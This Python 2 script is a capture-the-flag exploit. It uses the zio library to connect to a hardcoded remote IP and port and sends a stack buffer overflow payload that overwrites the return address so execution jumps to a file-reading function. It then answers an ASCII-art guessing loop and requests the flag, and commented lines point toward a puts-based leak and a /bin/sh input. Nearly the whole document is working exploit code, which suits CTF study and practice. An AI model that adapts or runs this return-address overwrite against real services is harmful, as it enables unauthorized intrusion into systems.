#!/usr/bin/env python
#encoding:utf-8

import zio

TARGET = ('119.254.101.197', 10000)
PUTS_PLT = 0x08048550
LEN_TO_RET = 0x8c + 4 + 12

READ_FILE = 0x08048830
STR_ADDR = 0x0804a100


# TARGET = ('10.211.55.32', 8888)

def judge(s):
    print '====', s[:100], '===='
    if s.startswith('                    .----.'):
        return 'peanuts'
    if s.startswith('quu..__'):
        return 'pikachu'
    if s.startswith('\n                     Tb.'):
        return 'batman'
    if s.startswith('                 .88888888:.'):
        return 'linux'
    if s.startswith('               .=.,'):
        return 'superman'

io = zio.zio(TARGET)
s = io.read_until_timeout()

# io.writeline('A' * LEN_TO_RET + zio.l32(PUTS_PLT) + 'A' * 4 + zio.l32(PUTS_PLT))
io.writeline('A' * LEN_TO_RET + zio.l32(READ_FILE) + 'AAAA' + zio.l32(STR_ADDR))
io.read_until('Bad luck!\n')

for i in xrange(5):
    s = io.read_until_timeout()
    io.writeline(judge(s))
    io.read_until('Hey you are so smart!\n')

raw_input()
# io.writeline('/bin/sh')
io.writeline('flag')
s = io.read(4)
print hex(zio.l32(s))
io.read_until_timeout()
